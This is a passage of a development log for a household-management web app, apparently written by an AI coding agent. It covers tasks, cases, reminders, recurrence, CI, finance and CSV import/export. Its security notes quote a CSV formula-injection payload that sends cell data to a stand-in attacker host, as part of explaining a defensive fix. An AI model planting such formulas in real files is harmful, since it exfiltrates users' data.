  a genuine Docker behavior worth recording: **`internal: true` on a
  Compose network blocks published ports from binding at all**, not just
  outbound internet access as the flag name might suggest (verified
  empirically: `docker port` stayed empty even after `--force-recreate`
  until the override also set `internal: false`). This doesn't affect the
  shipped `docker-compose.yml` — the override never ships — but is worth
  knowing for anyone else who tries to add a dev-only port-forward the
  "obvious" way.

### What remains for Phase 1 (not done in this pass, by design)

- Full `Sidebar`/`MobileBottomNav` per `docs/design/design-system.md` —
  deferred until more than 2 nav destinations exist (documented in
  `components/app-shell/AppShell.module.css`).
- Module-boundary lint enforcement (§2) — not added; still a Medium
  finding for whenever more than one `features/*` module exists to have
  boundaries between.
- `docs/architecture/deployment-feasibility.md`'s host-facts gap (§17) —
  still open, still requires the user's own environment access.

---

## Phase 2 — Attention engine (implemented)

Vertical slice 2 from `docs/implementation/implementation-plan.md`:
**Inbox -> task -> deadline -> today -> attention**.

### What was built

- **Domain** (pure, no I/O, exhaustively unit-tested):
  - `domain/tasks/task.ts` — the task state machine as a pure
    `applyTaskCommand(task, command, now)` returning either a patch plus an
    audit action, or a typed rejection. It implements exactly the
    transitions `docs/domain/state-machines.md` sanctions, plus
    `COMPLETED -> PLANNED` which that document *implies* rather than lists
    ("Reopening a completed task creates an audit event" is impossible
    unless reopening is a transition).
  - `domain/attention/rules.ts` — deterministic, explainable attention
    rules. Every surfaced item carries the reasons that surfaced it; the
    score only orders the list and is never shown, per
    `docs/requirements/product-spec.md`'s "Never show an opaque AI score as
    the primary attention mechanism."
- **Schema**: `inbox_item`, `task`, `task_person`, `deadline`, plus
  `household.timezone`. Migration `0001` generated and applied.
- **Application**: capture / triage-to-task / discard, `transitionTask`
  (authorization + optimistic concurrency + audit around the pure domain
  decision), `getInbox`, `getTasks`, `getAttention`, `getToday`,
  `application/time.ts` (household-timezone "today"),
  `application/policies/task.ts`.
- **UI**: `/inbox` (capture + triage), `/tasks`, `/today`, `/attention`,
  nav updated, full German/English copy including ICU plurals for the
  attention explanations.

### Product decisions taken here

- **Inbox is its own aggregate, not a task status.** `product-spec.md`
  journey 1 is "record something quickly without deciding its final
  structure", and CLAUDE.md §4.1 lists eight possible classification
  targets. A capture therefore has its own lifecycle and its own
  provenance (what it became) — neither of which belongs on the Task it
  might turn into. Added to `docs/domain/domain-model.md`'s aggregate set
  by implication; `triagedIntoType` is a plain string so the remaining
  targets can arrive with the aggregates they point at instead of forcing
  a migration per phase.
- **Deadline stays separate from `task.dueOn`.** A deadline is a date the
  household is committed to whether or not anyone has created work for it.
  Collapsing them would mean every commitment had to be phrased as a task
  before it could be tracked, which is how commitments get missed.
- **Landing page is `/today`, and the placeholder Dashboard was deleted.**
  `docs/design/screen-inventory.md` lists both, but its Dashboard
  (attention strip, deadlines, family events, trips, recent activity) is
  a summary of aggregates that mostly do not exist yet. A near-empty
  overview that nothing linked to was dead weight; Today answers the
  product's actual question today.
- **`WAITING -> COMPLETED` is deliberately not implemented**, because the
  domain doc does not sanction it — the documented path out of WAITING is
  back through IN_PROGRESS. This is friction a product owner may well want
  removed (a task waiting on a third party often just *resolves*), so it
  is flagged below as an open question rather than silently "fixed".

### Second critical production-only bug, found the same way

Browser-testing the new interactive UI surfaced a bug with the same shape
as the `trustHost` one, and again invisible to typecheck, lint and 88
unit/integration tests:

**The Content-Security-Policy added in Phase 1 (`script-src 'self'`) was
blocking Next.js's own inline RSC hydration scripts, so React never
hydrated.** Phase 1 did not catch it because every Phase 1 form degrades
gracefully without JavaScript — they post natively and worked perfectly.
Phase 2's first genuinely client-side control (the triage form's expand
toggle) simply did nothing.

Worse, the Phase 1 code carried a comment *asserting* this was safe
("Next.js App Router doesn't need inline scripts for its own hydration").
That assertion was wrong. It is now replaced with a nonce-based CSP
(`'nonce-…' 'strict-dynamic'`, with `'unsafe-eval'` added **only** when
`NODE_ENV !== "production"` for Next's dev-mode HMR), the nonce forwarded
on the request header so Next stamps it onto its own script tags.
Verified by reading the served header in both modes: production emits
nonce + `strict-dynamic` and no `unsafe-eval`.

The lesson is the one already recorded against ADR-006: a confident
comment is not verification. Both of this project's two most serious bugs
so far were *production-only*, and both were found only by running the
real artifact in a real browser.

### Test-suite bugs fixed (worth distinguishing from product bugs)

Four failures during this phase were defects in the tests, not the app,
and are recorded so they are not mistaken for product behaviour later:
- Two Vitest integration files truncating one shared database in parallel
  deadlocked each other — split into separate Vitest projects so
  integration runs serially (`singleFork`) while unit tests stay parallel.
- `overrides.nextAction ?? default` in a test helper silently replaced the
  explicit `null` the test existed to pass.
- `getByRole("alert")` and `getByRole("heading", {name: "Today"})` both
  became ambiguous once hydration worked and a section heading appeared —
  the selectors, not the markup, were wrong.
- The E2E suite tripped its own sign-in rate limiter again, because
  `globalSetup` truncated the domain tables but not the limiter's own
  table (which `rate-limiter-flexible` owns, outside the Drizzle schema),
  so attempts accumulated across runs inside the 15-minute window.

### Verification performed

- `pnpm typecheck`, `pnpm lint` — clean.
- `pnpm test` — **88 passing** (48 domain unit tests covering every legal
  and illegal task transition and every attention rule, plus 18
  integration tests running the real Capture → Triage → Execute → Complete
  loop against PostgreSQL, including optimistic-concurrency conflicts and
  person-scoped authorization).
- `pnpm test:e2e` — **27 passing** across desktop and mobile against the
  production standalone artifact, including the full capture-to-attention
  journey and zero automatically detectable WCAG 2.2 AA violations.
- Manual browser walkthrough: captured an item, triaged it into a task
  with a past due date, watched it appear on Today and on Attention
  labelled "13 days overdue", started it (owner auto-assigned, satisfying
  the IN_PROGRESS-requires-owner invariant), completed it, and confirmed
  it left both projections.

### Open question for the product owner

Should `WAITING -> COMPLETED` (and `WAITING -> CANCELLED`) be allowed
directly? The domain doc currently routes both through IN_PROGRESS. The
strict reading is implemented; loosening it is a one-line change to
`ALLOWED_TRANSITIONS` plus a state-machines.md update, but it is a product
decision, not an engineering one.

### Phase 2b — outbox and notifications (implemented)

CLAUDE.md §17's third Phase 2 item, completed as a second increment. This
also closes this audit's §8 open question about **where the outbox worker
runs**, now decided in
[ADR-013](../architecture/adr/ADR-013-outbox-worker-hosting.md).

- **`outbox_event`** — written in the *same transaction* as the domain
  change that caused it (ADR-004), so an event can never be "sent but not
  applied" or "applied but never sent". `emitOutboxEvent` deliberately
  requires the transaction handle rather than defaulting to the
  module-level `db`, because an outbox write outside its domain
  transaction defeats the whole pattern and that mistake should be hard to
  make by accident. A test asserts the event rolls back with a failed
  transaction.
- **Worker** — in-process, started once from `instrumentation.ts`,
  claiming rows with `SELECT ... FOR UPDATE SKIP LOCKED`. The lock matters
  even though one worker is expected: it is what makes "only one" an
  assumption nobody has to enforce, so a rolling restart or a developer's
  `pnpm dev` pointed at the same database cannot double-deliver. Retries
  back off exponentially (5s→80s) and then stop in a terminal `FAILED`
  state with the error kept on the row, rather than retrying forever.
- **`notification`** — the first delivery channel, in-app, with a
  **unique** `(householdId, dedupeKey)` index. That constraint, not
  handler discipline, is what makes at-least-once delivery safe; the
  handler uses `onConflictDoNothing` so a redelivery is a genuine no-op.
  Per CLAUDE.md §16 a notification carries the task title and a link
  rather than saying "Task updated".
- Notifications are per-account: the `userId` predicate *is* the
  authorization, and a test asserts one member naming another member's
  notification id cannot mark it read (BOLA).

**Third bug found only by looking, not by testing green.** After the
notification rendered and 103 tests passed, Next.js's dev overlay still
reported six issues: next-intl treats `.` in a message key as a namespace
separator and rejects a literal dotted key, so the `types["task.assigned"]`
label was erroring on every render. The outbox naming ("task.assigned")
and the i18n key naming are now mapped explicitly instead of one being
bent to fit the other. The suite was green throughout — the console was
not.

Verified live rather than only in tests: seeded a task assigned to a
second household member, waited for the **worker inside the running app**
to poll, and confirmed the event moved to `PROCESSED`, the notification
row appeared, the nav badge showed "Notifications 1" for that member and
nobody else, and "Mark all as read" cleared both the badge and the item
state.

---

## Phase 3 — Cases and context (implemented)

Vertical slice 3: **case -> next action -> waiting -> timeline -> linked
work**.

- **`domain/cases/case.ts`** — the Case state machine, verbatim from
  ADR-007, as a pure function alongside the Task one. The two machines are
  deliberately *not* symmetric, and the code says why: a case can be
  BLOCKED and ARCHIVED and cancelled straight from WAITING; a task cannot,
  but a task can be reopened and a case cannot. Each follows its own
  documented shape rather than being filed down to match the other.
- **WAITING demands a follow-up date *or* a stated reason** — the explicit
  escape hatch `state-machines.md` allows. A blank reason counts as no
  reason. This is the mechanism behind product-spec.md's "without these
  fields, a waiting list becomes a graveyard", and it is enforced in the
  domain, surfaced in the UI, and covered by unit, integration and E2E
  tests.
- **`case_event`** is the timeline: append-only, carrying both status
  changes and human notes. Notes take no version and cannot conflict —
  appending to a history is commutative, so two people writing at once is
  two notes, not a conflict to resolve. Optimistic concurrency stays on the
  case's mutable fields where it belongs.
- **Cases join tasks in one attention list.** This required refactoring
  `domain/attention/rules.ts` to take a *normalised* candidate (`waiting`,
  `blocked`, `actionable`) instead of a status string. The rules now never
  see either aggregate's status enum, so adding a status cannot silently
  change attention behaviour — and the reimbursements, warranties and trips
  the product spec promises will feed the same rules without touching them.
  The existing integration tests passed unchanged through the refactor,
  which is what made it safe.
- A new **BLOCKED** attention reason, weighted above WAITING: waiting is
  stalled on someone else, blocked is stalled on something the household
  itself can act on.

### Bugs found in this phase

- **A stale disclosure in the case UI.** After a successful transition the
  component re-renders with a new status, but the "waiting" form's open/
  closed state is client state and survived — leaving an expanded form
  offering an action the state machine would now reject. Fixed by deriving
  the form's visibility from the current status as well as the toggle.
  Found by clicking through it, not by any test.
- **`z.infer` where `z.input` was meant.** Command input types were derived
  from the schema's *output*, in which every `.default()` field is already
  required — so callers were forced to pass the very values the schema
  exists to supply. Caught by `tsc` (Vitest does not typecheck, so the
  integration tests had been passing happily). Fixed in three commands.
- **My own CSP broke the dev HMR socket.** `connect-src 'self'` does not
  cover `ws:`. Production has no HMR so nothing shipped broken, but it was
  a real developer-experience regression I had introduced; `ws:`/`wss:` are
  now allowed in development only, alongside the existing dev-only
  `unsafe-eval`.

### Verification

`pnpm typecheck`, `pnpm lint` clean; **159 unit/integration tests** (33 new
for the case machine, 20 new integration covering the timeline, linking,
concurrency and authorization); **35 E2E** across desktop and mobile
including three new case journeys; and a manual walkthrough that opened a
case, was correctly refused an open-ended wait, parked it with a stated
reason, blocked it, and saw each step land on both the timeline and
Attention.

---

---

## Phase 4a — Time-triggered reminders (implemented)

The item deferred twice, now closed: the outbox has a **scheduled
producer**, so `followUpAt` actively nudges instead of waiting to be
noticed.

Everything else in the application emits outbox events as a consequence of
someone acting. Reminders are the exception — *nobody acts when a
follow-up date arrives*, which is precisely the problem they exist to
solve — so `application/reminders/scanForReminders.ts` notices the passage
of time instead, and emits into the outbox built in Phase 2b. Nothing
about the delivery path had to change.

It scans three things: tasks waiting past their follow-up, cases waiting
past theirs, and deadlines inside a seven-day window (deliberately wider
than Attention's three-day "due soon": Attention answers "what should I
look at when I open the app", a reminder answers "what should interrupt
me", and a commitment deserves more warning than a task).

**Idempotency is structural, not remembered.** The obvious design — a
`reminded` boolean — needs every command that changes a date to remember to
clear it, and one that forgets produces a reminder that never fires again.
Instead the columns store *which moment was announced*
(`followUpNotifiedAt`, `remindedForDueOn`) and the scan compares them
against the current value. Rescheduling a follow-up therefore re-arms the
reminder by itself, and no command has to know reminders exist. Tests
cover both halves: the same follow-up is never announced twice across
repeated scans, and moving the date does produce a second announcement.

Recipients resolve to the accountable person, falling back to the creator.
A person with no login has nowhere to be told, which is a normal outcome
rather than a failure — the item still appears in Attention.

### Verification

177 unit/integration tests (18 new, covering every before/after/repeat/
re-arm/ignore case) and 35 E2E. Verified live: seeded a task whose
follow-up had already passed, started the app, and watched the in-process
scan emit, the worker deliver, and the notification render — **with no
user action at all**, which is the entire point.

---

---

## Phase 4b — Calendar and recurrence (implemented)

CLAUDE.md §7 sets the bar specifically: "Recurring events must store
recurrence rules and a timezone… DST transitions must have tests." The
requirement is therefore not "support recurrence" but "be correct across
DST", which is what shaped the design ([ADR-014](../architecture/adr/ADR-014-recurrence.md)).

**Events store a wall clock plus an IANA zone, never a bare instant.**
"Swimming, Tuesdays at 17:00" is a statement about the clock on the wall.
Store a UTC instant and add seven days and the series drifts an hour
across a transition — the family arrives at the pool at the wrong time.
So occurrences are generated as wall-clock values and only then converted
to instants, each with the offset in force on its own date.

Two DST edge cases have no single right answer and were decided
explicitly, documented in the code and covered by tests: a time **skipped**
by the spring-forward resolves *forward* (02:30 → 03:30) rather than
throwing — a recurring event must not vanish once a year — and an
**ambiguous** time on the autumn fall-back resolves to the *first* of its
two readings.

No date or recurrence dependency was added. `rrule` expands in UTC and
leaves the timezone problem to the caller, so it would have added a
dependency without removing the hard part; the two `Intl`-based
conversions this needs are ~60 lines against data the platform already
ships. A deliberately small rule vocabulary (DAILY/WEEKLY/MONTHLY/YEARLY,
interval, weekly by-weekday, count/until) covers what households actually
schedule.

Smaller decisions worth recording: a monthly event on the 31st **skips**
months without a 31st rather than sliding to the 28th, which would invent
a commitment on a day nobody chose; `count` counts over the series rather
than the query window, so "the first five lessons" means the same five
whichever month is on screen; and expansion is bounded, because an
open-ended daily rule queried over a decade would otherwise be a denial of
service against the household's own server.

### Three bugs found, each by a different means

- **A real mobile layout bug, found by the E2E suite failing.** `.nav` was
  a flex row with no `flex-wrap`, so each nav destination pushed the page
  wider until, at eight, a 375px phone overflowed horizontally and taps
  started landing on the wrong element — violating
  `implementation-handoff.md`'s "Never horizontally scroll primary
  content". Fixed, and now guarded by a test asserting `scrollWidth <=
  clientWidth` on four pages at mobile width, so the next nav item cannot
  quietly reintroduce it.
- **A clock-skew bug in the outbox worker, found by intermittent test
  failures.** `next_attempt_at` is written by the *database* clock but was
  compared against the *application's* `new Date()`. The Postgres
  container here ran ~0.4s ahead of the host, leaving just-inserted events
  unclaimable for a few hundred milliseconds. This was a genuine
  production robustness issue, not a test artifact: any clock drift
  between app and database would have stalled delivery. The claim now uses
  the database's own `now()` — one clock decides.
- **A test race**, of the same class as one in Phase 2: `count()` takes a
  snapshot and does not retry, unlike `toBeVisible()`, so counting rows
  straight after a Server Action click raced the write.

### Verification

221 unit/integration tests (44 new: 11 timezone, 21 recurrence, 12
calendar integration) and **51 E2E** across desktop and mobile. The suite
was run three times over to confirm the flakiness was genuinely fixed
rather than merely passing once. Verified live in the browser: a weekly
17:00 event spanning the 25 October 2026 fall-back renders as 17:00 on
18 Oct, 25 Oct and 1 Nov, despite the underlying instants differing by an
hour — the wall-clock design doing exactly its job.

---

### Not yet done

- **The mobile bottom nav** from `docs/design/design-system.md`. The top
  bar was the right call at two destinations and is the wrong one at
  eight: it now wraps onto multiple rows and eats real vertical space on a
  phone. This is the outstanding design-system debt and should be the
  first item of the next UI-facing phase. **Resolved in Phase 4c below.**
- **Notification preferences and quiet hours** (CLAUDE.md §16). Worth
  correcting an overstatement in the Phase 4a notes: with delivery
  currently in-app only, a notification created at 03:00 wakes nobody, so
  quiet hours matter materially only once a *push* or email channel
  exists. Volume and relevance are the real near-term concerns, and
  dedupe already addresses the worst of that.
- **Organizations, contacts and document references** (the rest of
  CLAUDE.md §17's Phase 3 list) are not built. Cases carry an
  `externalReference` string, which covers the common "their file number"
  need; a full Organization/Contact aggregate is worth doing when there is
  a second thing that needs to point at one (documents, expenses), rather
  than now for its own sake.
- **Reminders proper** (time-triggered: "follow-up date reached", "deadline
  in 3 days") still do not exist. The outbox delivers *event*-triggered
  notifications; a scheduled scan that emits events when a date arrives is
  the natural Phase 4 addition alongside the calendar, and needs no new
  infrastructure — it emits into the same outbox.
- Notification preferences, quiet hours and escalation (CLAUDE.md §16) are
  not implemented. They are meaningful only once there is more than one
  channel and more than one event type competing for attention.

---

### Git

This repository had no version control (`git init` had never been run).
Initialized it partway through Phase 1, specifically so the
`middleware.ts` -> `proxy.ts` codemod (`@next/codemod@canary`) could run
safely with `--force` and a reviewable diff, rather than either skipping a
real verification tool or risking an unreviewable destructive rewrite on
an unversioned tree. `.gitignore` was already correct (verified `.env`,
`node_modules`, and the dev-only Compose override are excluded before the
first commit).

---

## Phase 4c: clearing the navigation debt, and the CI gate that was missing

Two items are resolved here. Neither is a feature; both were named as debt
earlier in this document, and both compound with every phase that adds a
screen — which is why they were done before Phase 5 rather than after.

### 1. The navigation did not scale (High, resolved)

**Problem.** The shell had one wrapping row of links in the top bar. That
was adequate at two destinations and wrong at eight: at 375px it first
overflowed horizontally (taps landed on the wrong element, and seven
mobile E2E tests timed out), and the `flex-wrap` stopgap then ate several
rows of vertical space on the very viewport that has the least of it.
Phase 5 would have added a ninth destination.

**Resolution.** The shell now has two layouts, chosen by a CSS media query
at 768px rather than by sniffing the user agent on the server, so a
resized window stays correct:

- **Desktop** — a 248px sidebar listing every destination.
- **Phone** — a fixed 64px bottom bar with four destinations plus `More`,
  clear of the home indicator via `env(safe-area-inset-bottom)`.

The four are the ones that answer "what needs my attention?":
Today, Inbox, Attention, Notifications. The reference views — Tasks,
Cases, Calendar, Family — live on `/more`, a real page rather than a
sheet, so it needs no JavaScript and can be linked.

The split is declared once, in `components/app-shell/navItems.ts`. The
sidebar, the bottom bar and `/more` all read it, so they cannot drift; a
destination added by a later phase defaults to secondary and the bar does
not grow.

**Files:** `components/app-shell/navItems.ts` (new),
`components/app-shell/Nav.tsx` (new), `components/app-shell/AppShell.tsx`,
`components/app-shell/AppShell.module.css`, `app/(app)/more/page.tsx`
(new), `messages/en.json`, `messages/de.json`,
`docs/design/implementation-handoff.md`.

**A second bug the rewrite exposed.** "Notifications" does not fit a
75px bottom-bar slot. It wrapped to two lines and then clipped against
the 64px bar — visible only by actually looking at a 375px viewport, since
nothing overflowed horizontally and every automated check stayed green.
The German "Mitteilungen" fails the same way. `NavItem.shortLabelKey` now
supplies a deliberate short label for the bar ("Alerts" / "Meldungen");
the visible text is the accessible name in both layouts, so WCAG 2.2
SC 2.5.3 (Label in Name) holds either way.

**Tests.** The keyboard-navigation accessibility test previously tabbed to
"Family", which no longer exists in the phone layout — a test that would
have failed for the right reason. It now targets Inbox, which is present
in both layouts, and two new project-gated tests cover what the split
actually promises: that the sidebar carries all eight destinations and
marks the current one with `aria-current` (not colour alone), and that on
a phone every secondary destination is still reachable *by keyboard*
through `More`. The horizontal-overflow guard was extended to
`/notifications` and `/more`. The suite: 221 unit/integration tests and 59
E2E tests pass, 2 skipped by project gate.

### 2. There was no CI (High, resolved)

**Problem.** CLAUDE.md §17 lists "CI quality gates" as a Phase 1
deliverable and §1.20 lists the gates themselves. Phase 0 recorded these
as "CI-equivalent local quality gates" — which is a fair description of
what existed, and not the same thing. Every gate ran only because I chose
to run it. Nothing enforced them on a change, and nothing would have
caught a contributor (or a future session) skipping one.

**Resolution.** `.github/workflows/ci.yml` runs typecheck, lint,
migrations, unit + integration tests, build, and the E2E/accessibility
suite against a `postgres:18.6` service — the same image tag as
`docker-compose.yml`, pinned because every primary key defaults to
PostgreSQL 18's native `uuidv7()`. It uses Node 22 to match the
Dockerfile's runtime image rather than the newer Node this was developed
on, so a Node-24-only assumption would fail here rather than in
production. The commands are the ones in `package.json`, in the order used
locally, so a green local run and a green CI run mean the same thing. On
failure the Playwright HTML report is uploaded.

**Honest limitation:** the workflow's YAML structure is validated and each
step's command was run locally in this order against a clean `.next`, but
the workflow itself has not executed on a GitHub runner — this repository
has no remote. The first push will be its real test. The most likely
first failure is an environment difference (a Playwright system
dependency, or the Postgres service's readiness window), not a logic
error.

**Still outstanding from the Phase 1 security baseline:** dependency and
container scanning (CLAUDE.md §12). Adding a scanner is one more job in
this file; it is deliberately not bundled into the same change as
establishing the gate itself.

---

## Phase 5: Finance

Expenses, budget envelopes and the reimbursement lifecycle, plus one
application-wide defect this phase happened to uncover.

### What the specification did not say

`docs/domain/domain-model.md` gives Expense, Reimbursement and Budget one
line each; `docs/domain/state-machines.md` gives the reimbursement
lifecycle six. Everything else had to be decided. **ADR-015** records each
decision and why, and `docs/domain/state-machines.md` has been amended
rather than left to disagree with the code. The decisions that would be
expensive to reverse:

- **Money is integer minor units plus an ISO 4217 code, per row.** Never a
  float, never `numeric` read back into a JS number, and `bigint` rather
  than `integer` so a mis-parsed row fails instead of overflowing at about
  21 million euros.
- **Amount parsing has one documented rule**, shared by the form and (in
  future) CSV import, rather than a locale guess. It is knowingly
  ambiguous for input like `1,234`, which is why the rule is pinned by
  tests and why import will confirm every parsed row.
- **Expenses default to `SENSITIVE`** — the only aggregate that does. The
  policy kernel already refuses a `CHILD` anything above `NORMAL`, so this
  one default is what keeps household spending away from a child account.
  Defaulting to `NORMAL` and raising it per call site would fail open, and
  this project has already been bitten by exactly one such default.
- **Budgets are recurring monthly envelopes**, not a row per month, so
  "what was the limit in March?" is answerable without a job having run.
  Changing a limit ends one envelope and starts another, so a past month
  keeps the figure it was reported with.
- **Currencies are never converted.** Spend in a currency no envelope
  covers is reported as uncovered, out loud, rather than folded in at a
  rate this app cannot verify.

Two corrections to the documented state machine, both in ADR-015 section 6:
`WAITING -> REJECTED` was added, because a refusal almost always arrives
while waiting and the common case otherwise had no legal path; and "any
open state" was enumerated, excluding `PAID`, because cancelling a claim
whose money has arrived would record something untrue.

### Attention needed no new rule

`docs/requirements/product-spec.md` lists "unresolved reimbursement" as an
attention trigger. A claim sitting on a counterparty *is* a wait, so it
maps onto the normalised candidate shape from Phase 3 and the existing
`FOLLOW_UP_DUE` / `WAITING_TOO_LONG` / `WAITING_INDEFINITELY` rules apply
unchanged. That reuse is precisely what the Phase 3 refactor was for, and
it is the first time it has been tested by a third aggregate. Claims also
join `scanForReminders` with the same structural-idempotency trick as
tasks and cases.

### Totals are summed from authorized rows, not in SQL

Budget spend is added up from the expense list the actor is allowed to
read, not with a `sum()` in the database. That costs a little efficiency
and buys a property worth more: the totals on the page always add up to
the rows on the page. Summing in SQL would show a `CHILD` or a
person-scoped `ADULT` a category total that includes expenses the same
page refuses to list — a disclosure by arithmetic, because the reader can
subtract. There is an integration test for this specifically.

### Critical bug found by watching the network, invisible on screen

**Every mutating form in the application was silently inert until
hydration.**

React renders a `useActionState` form with an `action` attribute that
throws if the form is submitted natively. A submit **before hydration**
therefore does nothing at all: no network request, no error, no console
message, no visual change. The button looks enabled, the click lands, and
the application ignores it.

This was not visible in any test or on screen. It surfaced because a
Playwright test failed in a way that made no sense — the same journey
passed in one test and failed in another whose only difference was that it
clicked once instead of twice — and the answer only appeared after
attaching a request listener and finding that *no POST was ever made*.

Two consequences, both real for a user:

1. A fast click on a freshly loaded page is discarded silently. The window
   is short on a fast connection, long on a slow one, and never closes at
   all if the JavaScript fails to load.
2. Worse, text typed into a field before hydration is **discarded when
   React hydrates it**. The failing test filled a required field, clicked,
   and got back a page with the field empty and no error at all — the
   browser's own `required` validation had blocked a submit of data the
   user had visibly entered.

**Resolution.** `components/ui/useHydrated.ts` — a `useSyncExternalStore`
whose server snapshot is `false` and client snapshot is `true`, so it is
correct during hydration itself rather than one paint later. Every submit
button in the application is now disabled until its form has hydrated: all
nine components that use `useActionState`, not only the new ones.

This is an improvement, not a cure, and the distinction matters: with
JavaScript unavailable these forms cannot work either way. What changes is
that the control now *says* it is not ready instead of pretending to be.
The honest statement of this app's requirements is that **it needs
JavaScript for every write**. That was already true; it is now visible
rather than hidden behind a dead button.

It also gave the E2E suite an honest readiness signal — "the submit button
is enabled" now means "this form is live" — which replaced what would
otherwise have been a sleep.

**Files:** `components/ui/useHydrated.ts` (new), and the nine components
that `grep -l useActionState app components` lists.

### Also in this phase

- `components/ui/SelectField.tsx` and `components/ui/Money.tsx` join the
  design system. `Money` is the single place minor units become a decimal,
  at the edge, for display only; it emits `<data value>` so a test asserts
  on the figure rather than on `Intl`'s localised output.
- Two forms on the finance page both had a field labelled "Category". The
  test that tripped over it was right to: two identically named controls
  on one page are ambiguous for a screen-reader user too. The budget
  form's is now "Category to budget".
- `tests/support/database.ts` derives the truncate list from the schema.
  It had been written out by hand in six places, and each new phase meant
  remembering all six — a chore whose failure mode is quiet: a forgotten
  table leaves rows behind, and the test that breaks is an unrelated one
  in a later file.
- The desktop and mobile E2E projects share one database and run in
  sequence, so the finance journeys take a month of their own per project.
  Two of the three failures on the first full run were assertions that
  silently depended on which project had run first.

### Verified

`tsc --noEmit`, `eslint .`, 304 unit and integration tests, `next build`,
and 71 E2E tests (2 skipped by project gate) against the standalone bundle
the Dockerfile ships — run twice, with identical results.

### Not done in Phase 5

- ~~**CSV import and export**~~ — done in Phase 5b below. The domain support existed — `parseAmountToMinor` and
  `formatMinorAsDecimal` were written for it and are tested against the
  awkward cases — but the confirm-before-writing import flow that ADR-015
  commits to is a vertical slice of its own, and shipping the parser
  without it would mean shipping exactly the part that can be silently
  wrong by a factor of a thousand.
- **Editing an expense.** It can be recorded and archived; changing one
  means archiving and re-recording. Archive-over-edit is the documented
  lifecycle preference (CLAUDE.md section 6), but a typo in an amount
  deserves a better answer than that.
- **Linking an expense to a case**, the obvious next connection, which
  waits on the same document-reference work Phase 3 deferred.

---

## Phase 5b: CSV import and export

This closes the item Phase 5 deliberately left open. `docs/implementation/roadmap.md`
lists CSV under finance; ADR-015 committed to a specific shape for it, and
that commitment is what made it a slice of its own rather than a parser
bolted onto the expense form.

### Review before writing, because the parser can be wrong

The amount rule is knowingly ambiguous: `1,234` is one thousand two
hundred and thirty-four to a German reader and one point two three four to
an American one, and nothing in a bank CSV settles it. No parser can fix
that, so the workflow carries the uncertainty instead — **upload, see every
row and the amount it was read as, then confirm.**

Two properties make that honest rather than decorative:

- **The confirm step re-plans the same text**, not the reviewed rows.
  `planExpenseImport` is pure and deterministic, so running it again on the
  same input cannot produce a different answer. The preview and the write
  are therefore incapable of disagreeing, and nothing structural has to be
  trusted after a trip through the browser.
- **Nothing is ever silently dropped.** A row that cannot be read appears
  in the preview with the reason, and the counts say how many will be
  imported and how many skipped.

Rows that already exist are flagged, not refused. Two identical coffees on
one day are a real thing, and so is deliberately re-importing a file; the
household decides.

### What the reader refuses to guess

- `12/05/2026` is rejected. It is 12 May to half the world and 5 December
  to the other half, and guessing puts an expense in the wrong month
  silently. ISO and German dotted dates are accepted.
- A negative amount is reported as "not a spend" rather than stored. Bank
  exports mix income and spending; a credit filed as a negative expense
  would quietly reduce a category total.
- An unrecognised category is reported rather than quietly filed as
  `OTHER`.

### Two security findings, both in the export direction

1. **CSV formula injection.** A description of
   `=HYPERLINK("https://evil.example/?d="&A1,"Click")` executes when the
   exported file is opened in Excel or LibreOffice, with the household's
   own data in the request. The export is the dangerous direction
   precisely because the file leaves the application and the browser's
   protections with it. `escapeCsvField` applies OWASP's mitigation —
   prefix the cell with `'`, which spreadsheets treat as literal text.
   Tested against `=`, `+`, `-`, `@`, tab and CR.
2. **An export must never be wider than the page.** `exportExpensesCsv`
   builds the file from `getExpensesForMonth`, the same authorized read the
   page uses, so it cannot contain a row the page would refuse to show. An
   integration test asserts a `CHILD` gets a header and nothing else. The
   route handler also re-reads the session itself, sets `no-store`, and
   returns 401 rather than redirecting — a caller that asked for a file
   should get a refusal it can recognise, not a sign-in page with a 200.

### A delimiter bug the tests caught

The first delimiter detector counted separators outside quotes. That is
wrong on realistic data: in `"Müller, Zahnarzt";89,90` there is exactly one
comma and one semicolon outside the quotes, so the count ties and has to
guess — and guessing comma splits the amount in half. It now parses with
each candidate and judges the result: comma leaves a quoted field with text
stuck to its closing quote, which well-formed CSV never has. Ordered by
fewest malformed fields, then a consistent column count, then most
columns.

### Locale parity is now enforced

`tests/unit/i18n-parity.spec.ts` asserts that both catalogues carry the
same keys, that no value is an empty string, and that a message uses the
same ICU arguments in both languages. next-intl throws on a missing key
rather than falling back, so a key added in English and forgotten in German
is a crash on that page for a German-speaking household — and neither a
typecheck nor an English-language test would notice. Phase 2 already
shipped one render-time message bug that 103 green tests missed.

The placeholder check needed a second attempt: a naive `\{(\w+)` reads a
plural branch body like `{No rows can be imported}` as an argument named
"No", which produced five false positives on existing messages. It now
requires the identifier to be followed by `,` or `}`. That is an
approximation rather than an ICU parser, and the comment says so.

### No new dependency

`domain/finance/csv.ts` is about sixty lines and fully tested. A CSV
library would also bring streaming, type coercion and a transform pipeline
this app has no use for, and its escaping would still have to be audited
for the formula-injection problem above, which most CSV writers do not
address. CLAUDE.md §16 asks for that reasoning to be written down rather
than assumed.

### Verified

`tsc --noEmit`, `eslint .`, 357 unit and integration tests, `next build`,
and 87 E2E tests (2 skipped by project gate) against the standalone
bundle. The import preview also gets its own axe sweep inside the journey,
because it is markup that only exists after an upload and the page-level
accessibility test never sees it — and its own horizontal-overflow guard,
for the same reason.

### Known limitation

The preview is capped at 1000 rows and 1 MB. A larger file has to be split.
Streaming it would mean giving up the "review the whole thing first"
property, which is the feature.

---

## Phase 6a: Trips, accessibility verification and packing

Vertical slice 6 of `docs/implementation/implementation-plan.md`. The
domain model gave Trip one line and the state machines document gave it
nothing, so most of this was decisions; **ADR-016** records them and
`docs/domain/state-machines.md` now has a Trip section rather than a gap.

### The decision worth arguing about

**A trip has no IN_PROGRESS or COMPLETED status.** Whether it is upcoming,
happening or over is a fact about today's date and the trip's two date
columns. Storing it as well would need a job to maintain, could disagree
with the dates it came from, and would be wrong for any household whose
instance was off over the weekend.

This is the attention engine's own argument — "a projection, not stored
truth" — applied to something small enough that storing it would have
looked harmless. The test reads one row on three different days and gets
three answers.

What *is* stored is what a date cannot say: committed, given up, or
finished with. `CONFIRMED -> PLANNED` exists because bookings fall
through, and a household without it would have to either leave the record
lying or cancel a trip it is still taking.

### Access requirements are the point of the feature

They are placed first on the page, ahead of packing and the itinerary,
because they are the only thing on a trip that cannot be fixed the night
before.

An answer must carry **who said so and when** — enforced by the domain and
by a database `CHECK`, because "the hotel is step-free" is worth nothing
without a source the household can weigh, re-check, or hold someone to on
arrival.

`REFUSED` counts as answered. A household that knows the hotel has no lift
can act on it; treating that as an open question would nag them about
something they have already settled.

